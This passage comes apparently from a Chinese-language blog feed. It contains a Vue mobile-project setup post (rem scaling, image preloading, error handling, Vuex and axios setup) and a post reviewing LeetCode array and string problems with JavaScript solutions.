<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根元素的font-size根据屏幕宽度自适应设置，当设备宽度为375(iPhone6)时，根元素font-size=16px</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">doc, win</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> docEl = win.document.documentElement;</span><br><span class="line">      <span class="keyword">var</span> resizeEvt = <span class="string">'orientationchange'</span> <span class="keyword">in</span> <span class="built_in">window</span> ? <span class="string">'orientationchange'</span> : <span class="string">'resize'</span>;</span><br><span class="line">      <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * ================================================</span></span><br><span class="line"><span class="comment">        *   设置根元素font-size</span></span><br><span class="line"><span class="comment">        * 当设备宽度为375(iPhone6)时，根元素font-size=16px; </span></span><br><span class="line"><span class="comment">        × ================================================</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">      <span class="keyword">var</span> refreshRem = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clientWidth = win.innerWidth</span><br><span class="line">                          || doc.documentElement.clientWidth</span><br><span class="line">                          || doc.body.clientWidth;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (!clientWidth) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">var</span> fz;</span><br><span class="line">        <span class="keyword">var</span> width = clientWidth;</span><br><span class="line">        fz = <span class="number">16</span> * width / <span class="number">375</span>;</span><br><span class="line">        docEl.style.fontSize = fz + <span class="string">'px'</span>;</span><br><span class="line">      &#125;;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">if</span> (!doc.addEventListener) <span class="keyword">return</span>;</span><br><span class="line">      win.addEventListener(resizeEvt, refreshRem, <span class="literal">false</span>);</span><br><span class="line">      doc.addEventListener(<span class="string">'DOMContentLoaded'</span>, refreshRem, <span class="literal">false</span>);</span><br><span class="line">      refreshRem();</span><br><span class="line">    </span><br><span class="line">    &#125;)(<span class="built_in">document</span>, <span class="built_in">window</span>);</span><br></pre></td></tr></table></figure>
<h3 id="图片预加载"><a href="#图片预加载" class="headerlink" title="图片预加载"></a>图片预加载</h3><blockquote>
<p>图片预加载就是在进入主页面之前，会将引入的一些图片预先加载到浏览器中它保证了图片快速、无缝地发布，也可帮助用户在浏览网站内容时获得更好的用户体验。当页面中需要loading页时也可以来作为页面加载的百分比数据。</p>
</blockquote>
<h4 id="整体实现"><a href="#整体实现" class="headerlink" title="整体实现"></a>整体实现</h4><blockquote>
<p>主要包含两个js文件，一个用来导出需要预加载的图片名称，另一个来进行预加载功能的实现</p>
</blockquote>
<h4 id="loader-js"><a href="#loader-js" class="headerlink" title="loader.js"></a>loader.js</h4><blockquote>
<p>主要是通过new Image后的onload来实现预加载，同时设置了一次的最大加载数。最终暴露出去的函数用户可以传递加载数和一个回调函数（接受当前加载的进度为参数）</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> list <span class="keyword">from</span> <span class="string">'./imgList'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> imgCount = list.length</span><br><span class="line"><span class="keyword">let</span> lists = [].concat(list)</span><br><span class="line"><span class="keyword">let</span> url = lists.map(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">require</span>(<span class="string">`../images/<span class="subst">$&#123;item&#125;</span>`</span>))</span><br><span class="line"><span class="keyword">let</span> loadCount = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> loadProcess = <span class="number">0</span></span><br><span class="line"><span class="keyword">let</span> totalCount = list.length</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadHandler</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> img = <span class="keyword">new</span> Image()</span><br><span class="line">    img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      loadCount++</span><br><span class="line">      loadProcess = <span class="built_in">parseInt</span>((loadCount / totalCount) * <span class="number">100</span>, <span class="number">10</span>)</span><br><span class="line">      <span class="keyword">return</span> resolve(url)</span><br><span class="line">    &#125;</span><br><span class="line">    img.onerror = reject</span><br><span class="line">    img.src = url</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadWarpHandler</span> (<span class="params">url, handler</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> promise = handler(url).then(<span class="function"><span class="params">img</span> =&gt;</span> (&#123;</span><br><span class="line">    img,</span><br><span class="line">    index: promise</span><br><span class="line">  &#125;))</span><br><span class="line">  <span class="keyword">return</span> promise</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgLoaders</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> &#123;</span><br><span class="line">    limit,</span><br><span class="line">    url,</span><br><span class="line">    handler</span><br><span class="line">  &#125; = options</span><br><span class="line">  <span class="keyword">let</span> requestImgs = url.splice(<span class="number">0</span>, limit).map(<span class="function"><span class="params">url</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> loadWarpHandler(url, handler)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (imgCount &lt; limit) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.all(requestImgs)</span><br><span class="line">  &#125;</span><br><span class="line">  url.reduce(<span class="function">(<span class="params">last, url</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> last.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.race(requestImgs)</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> posIndex = requestImgs.findIndex(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> item === res.index</span><br><span class="line">      &#125;)</span><br><span class="line">      requestImgs.splice(posIndex, <span class="number">1</span>)</span><br><span class="line">      requestImgs.push(loadWarpHandler(url, handler))</span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(error)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="built_in">Promise</span>.resolve())</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Promise</span>.all(requestImgs)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgLoadersStart</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> process = <span class="number">0</span></span><br><span class="line">  <span class="keyword">var</span> &#123;</span><br><span class="line">    limit = <span class="number">5</span>, Process</span><br><span class="line">  &#125; = options</span><br><span class="line">  imgLoaders(&#123;</span><br><span class="line">    limit,</span><br><span class="line">    url,</span><br><span class="line">    handler: loadHandler</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// debug</span></span><br><span class="line">  <span class="comment">// 递归来加数字</span></span><br><span class="line">  <span class="keyword">let</span> numberGrow = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> accTimer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (process &lt; loadProcess) &#123;</span><br><span class="line">        process++</span><br><span class="line">      &#125;</span><br><span class="line">      Process(process)</span><br><span class="line">      <span class="keyword">if</span> (process &lt; <span class="number">100</span>) &#123;</span><br><span class="line">        numberGrow()</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        clearTimeout(accTimer)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">20</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  numberGrow()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始执行</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (imgLoadersStart)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当进入页面之后，图片就会被加载<br><img src="/images/cli-load.png" alt="My Pic"></p>
</blockquote>
<h3 id="全局错误收集"><a href="#全局错误收集" class="headerlink" title="全局错误收集"></a>全局错误收集</h3><blockquote>
<p>主要目的是将项目运行中出现的错误收集起来（需要后端接口配合），便于找出问题，准确快速的修改错误，减少错误带来的损失。其中主要又包含了两种，一个是代码上的错误（主要是没考虑到一些情况如：后端返回数据的可能性、一些方法的兼容性等）。除此之外，还有接口的报错。</p>
</blockquote>
<h4 id="代码上的错误"><a href="#代码上的错误" class="headerlink" title="代码上的错误"></a>代码上的错误</h4><blockquote>
<p>由于使用的是vue框架，可以直接使用官方推荐的vue.config.errorHandler来捕获代码上出现的错误。指定组件的渲染和观察期间未捕获错误的处理函数。这个处理函数被调用时，可获取错误信息和 Vue 实例。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> errorHandler = <span class="function">(<span class="params">error, vm</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 调用相应的接口上传报错</span></span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'抛出全局异常'</span>)</span><br><span class="line">  <span class="built_in">console</span>.error(vm)</span><br><span class="line">  <span class="built_in">console</span>.error(error)</span><br><span class="line">&#125;</span><br><span class="line">Vue.config.errorHandler = errorHandler</span><br></pre></td></tr></table></figure>
<h4 id="接口上的错误"><a href="#接口上的错误" class="headerlink" title="接口上的错误"></a>接口上的错误</h4><blockquote>
<p>由于请求使用的axios，我们就可以通过拦截器拦截相应的请求和响应统一处理接口中出现的问题</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">service.interceptors.request.use(<span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Do something before request is sent</span></span><br><span class="line">  <span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Do something with request error</span></span><br><span class="line">  <span class="comment">// 上报相应的错误</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (response.data.status) &#123;</span><br><span class="line">    <span class="keyword">return</span> response.data.data</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 上报相应的错误</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(response.data.description)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, (error) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 上报相应的错误</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="axios和vuex初始化"><a href="#axios和vuex初始化" class="headerlink" title="axios和vuex初始化"></a>axios和vuex初始化</h3><h4 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h4><blockquote>
<p>按照官网的推荐建立的目录结构，使用module将数据细化到相应的功能或者文件，防止单个store文件越来越大。文件中包含了相应的state、getter、action、mutation等</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"><span class="keyword">import</span> createLogger <span class="keyword">from</span> <span class="string">'vuex/dist/logger'</span></span><br><span class="line"><span class="keyword">import</span> home <span class="keyword">from</span> <span class="string">'./modules/home'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> debug = process.env.NODE_ENV !== <span class="string">'production'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    home</span><br><span class="line">  &#125;,</span><br><span class="line">  strict: debug,</span><br><span class="line">  plugins: debug ? [createLogger()] : []</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getters</span></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// actions</span></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mutations</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  namespaced: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  getters,</span><br><span class="line">  actions,</span><br><span class="line">  mutations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="axios"><a href="#axios" class="headerlink" title="axios"></a>axios</h4><blockquote>
<p>axios的初始化主要是对baseURl，以及请求中的一些通用参数的配置。还有拦截器中对请求或者相应作出统一的处理。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span></span><br><span class="line">axios.defaults.crossDomain = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baseUrl = <span class="string">''</span></span><br><span class="line"><span class="keyword">var</span> service = axios.create()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add a response interceptor</span></span><br><span class="line">service.interceptors.request.use(<span class="function">(<span class="params">config</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// Do something before request is sent</span></span><br><span class="line">  <span class="keyword">return</span> config</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Do something with request error</span></span><br><span class="line">  <span class="comment">// 上报相应的错误</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">service.interceptors.response.use(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (response.data.status) &#123;</span><br><span class="line">    <span class="keyword">return</span> response.data.data</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 上报相应的错误</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(response.data.description)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, (error) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 上报相应的错误</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> service</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue-cli</category>
        <category>移动端</category>
      </categories>
      <tags>
        <tag>Vue-cli</tag>
        <tag>移动端</tag>
      </tags>
  </entry>
  <entry>
    <title>算法初探</title>
    <url>/2020/07/18/%E7%AE%97%E6%B3%95%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;算法一直是自己比较欠缺的地方，曾经有很多次自己都下定决心要好好学。结果就在刷题的过程中随着某一天的中断而结束了。之前自己刷过codewar、leetcode等，但是自己都是跟着题号刷，缺少针对性的练习和回顾。今天通过一篇文章来复习了一下，也就算复习和回顾几道比较典型的算法题吧（题目来自leetcode）。<br><a id="more"></a></p>
<h3 id="表查找问题"><a href="#表查找问题" class="headerlink" title="表查找问题"></a>表查找问题</h3><ol>
<li>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定 nums = [2, 7, 11, 15], target = 9</span><br><span class="line"></span><br><span class="line">因为 nums[0] + nums[1] = 2 + 7 = 9</span><br><span class="line">所以返回 [0, 1]</span><br></pre></td></tr></table></figure>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/two-sum" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这是一道很典型的表查找问题，我们可以建立一张表的value和索引的映照关系，遍历时再去查找是否存在相应的值</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> twoSum = <span class="function"><span class="keyword">function</span> (<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> index = map.get(target - nums[i])</span><br><span class="line">        <span class="keyword">if</span> (index !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [index, i]</span><br><span class="line">        &#125;</span><br><span class="line">        map.set(nums[i], i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>给定两个数组，编写一个函数来计算它们的交集<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [1,2,2,1], nums2 = [2,2]</span><br><span class="line">输出：[2,2]</span><br><span class="line"></span><br><span class="line">输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4]</span><br><span class="line">输出：[4,9]</span><br><span class="line"></span><br><span class="line">说明：输出结果中每个元素出现的次数，应与元素在两个数组中出现次数的最小值一致。我们可以不考虑输出结果的顺序。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/intersection-of-two-arrays-ii/</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>做法是，分别对两个数组建立value-&gt;count的表。对其中一个数组进行循环，查看值在两个表中出现的次数，然后将最小次的改值push到结果中</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> intersect = <span class="function"><span class="keyword">function</span> (<span class="params">nums1, nums2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map1 = makeCountMap(nums1)</span><br><span class="line">    <span class="keyword">let</span> map2 = makeCountMap(nums2)</span><br><span class="line">    <span class="keyword">let</span> res= []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> num <span class="keyword">of</span> map1.keys()) &#123;</span><br><span class="line">        <span class="keyword">let</span> a = map1.get(num)</span><br><span class="line">        <span class="keyword">let</span> b = map2.get(num)</span><br><span class="line">        <span class="keyword">if</span> (b !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="built_in">Math</span>.min(a, b); j++) &#123;</span><br><span class="line">                res.push(num)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeCountMap</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> temp = map.get(arr[i])</span><br><span class="line">        <span class="keyword">if</span> (temp !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">            map.set(arr[i], temp + <span class="number">1</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            map.set(arr[i], <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="双指针问题"><a href="#双指针问题" class="headerlink" title="双指针问题"></a>双指针问题</h3><ol>
<li>给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所有满足条件且不重复的三元组。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span><br><span class="line"></span><br><span class="line">满足要求的三元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/3sum" target="_blank" rel="noopener">https://leetcode-cn.com/problems/3sum</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这道题就是典型的双指针问题，对排好序的数组进行遍历，定一个基础点，后一个元素为start指针，最后一个元素为end指针，通过后两个点的前进和后退来找到满足要求的点。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> result = []</span><br><span class="line">        nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b)</span><br><span class="line">        <span class="keyword">while</span> (k &lt; nums.length - <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> i = k + <span class="number">1</span>, j = nums.length - <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="keyword">let</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">                <span class="keyword">if</span> (sum === <span class="number">0</span>) &#123;</span><br><span class="line">                    result.push([nums[k], nums[i], nums[j]])</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (sum &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[i] === nums[++i]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (i &lt; j &amp;&amp; nums[j] === nums[--j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (k &lt; nums.length - <span class="number">2</span> &amp;&amp; nums[k] === nums[++k]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>2.给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums = [-1,2,1,-4], target = 1</span><br><span class="line">输出：2</span><br><span class="line">解释：与 target 最接近的和是 2 (-1 + 2 + 1 = 2) 。</span><br></pre></td></tr></table></figure>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/3sum-closest" target="_blank" rel="noopener">https://leetcode-cn.com/problems/3sum-closest</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这道题和上面的解题思路一致，都是利用头尾两个指针去解决问题</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSumClosest = <span class="function"><span class="keyword">function</span>(<span class="params">nums, target</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> length = nums.length</span><br><span class="line">        <span class="keyword">if</span> (length === <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums.reduce(<span class="function">(<span class="params">prev, next</span>) =&gt;</span> prev + next, <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> min = <span class="literal">Infinity</span></span><br><span class="line">        <span class="keyword">let</span> result</span><br><span class="line">        nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b)</span><br><span class="line">        <span class="keyword">while</span> (k &lt; length - <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> i = k + <span class="number">1</span>, j = length <span class="number">-1</span></span><br><span class="line">            <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">                <span class="keyword">let</span> sum = nums[k] + nums[i] + nums[j]</span><br><span class="line">                <span class="keyword">let</span> diff = <span class="built_in">Math</span>.abs(sum - target)</span><br><span class="line">                <span class="keyword">if</span> (diff &lt; min) &#123;</span><br><span class="line">                    min = diff</span><br><span class="line">                    result = sum</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (target &gt; sum) &#123;</span><br><span class="line">                    i++</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; sum) &#123;</span><br><span class="line">                    j--</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> sum</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            k++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>
<h3 id="滑动窗口问题"><a href="#滑动窗口问题" class="headerlink" title="滑动窗口问题"></a>滑动窗口问题</h3><ol>
<li>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入: &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br><span class="line"></span><br><span class="line">输入: &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-substring-without-repeating-characters</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
<hr>
<blockquote>
<p>这也是一道很典型的滑动窗口类的问题，这道题中我们可以直接使用一个数组作为窗口，定一个起始点，当数组中没出现过该元素，将元素push到数组（将窗口扩大）同时计算之前的大小和数组长度之间的更大值。反之将数组中第一个元素shift同时继续循环。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> length = str.length</span><br><span class="line">    <span class="keyword">let</span> count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">let</span> arr = []</span><br><span class="line">    <span class="keyword">while</span> (index &lt; length) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr.indexOf(str[index]) === <span class="number">-1</span>) &#123;</span><br><span class="line">            arr.push(str[index])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr.shift()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        count = <span class="built_in">Math</span>.max(count, arr.length)</span><br><span class="line">        index++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也可以直接定义左右边界和一个存储是否重复的对象，当不存在时移动右边界，并将值存入对象。存在时移动左边界，将相应的值置空。</p>
</blockquote>
